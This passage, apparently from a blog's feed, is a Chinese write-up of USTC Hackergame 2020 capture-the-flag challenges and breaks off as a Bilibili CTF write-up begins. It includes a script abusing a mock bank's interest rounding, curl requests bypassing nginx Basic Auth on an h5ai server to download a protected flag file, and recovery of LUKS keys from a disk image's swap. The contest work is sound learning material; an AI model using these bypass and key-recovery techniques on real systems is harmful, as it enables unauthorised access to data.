为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-06</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" 